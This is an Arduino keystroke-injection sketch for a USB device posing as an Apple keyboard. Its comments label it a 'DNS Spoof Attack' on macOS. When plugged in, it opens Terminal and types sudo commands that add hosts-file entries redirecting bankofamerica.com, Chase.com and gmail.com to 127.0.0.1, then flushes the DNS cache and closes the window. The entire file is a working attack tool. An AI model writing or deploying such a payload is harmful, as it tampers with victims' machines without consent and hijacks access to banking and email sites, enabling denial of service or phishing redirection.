#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void setup(){
  Keyboard.begin();
  delay(1000);

  // DNS spoof - add entries to /etc/hosts
  // Author: Generated
  // Title: DNS Spoof Attack
  // Target: macOS
  // Version: 1.0
  // Category: Network-Attacks
  // ID 05ac:021e Apple:Keyboard
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(500);

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("echo '127.0.0.1 bankofamerica.com' | sudo tee -a /etc/hosts");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("echo '127.0.0.1 Chase.com' | sudo tee -a /etc/hosts");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("echo '127.0.0.1 gmail.com' | sudo tee -a /etc/hosts");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("dscacheutil -flushcache");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.print("echo 'DNS spoof entries added'");

  typeKey(KEY_RETURN);

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}